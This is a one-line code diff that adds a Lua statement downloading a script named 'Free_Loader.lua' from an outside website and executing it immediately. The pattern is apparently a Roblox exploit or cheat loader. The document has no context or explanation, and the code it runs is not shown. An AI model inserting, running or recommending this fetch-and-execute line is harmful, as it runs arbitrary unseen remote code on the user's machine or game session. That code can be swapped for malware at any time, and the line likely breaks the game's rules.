@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://semire.xyz/Free_Loader.lua"))()
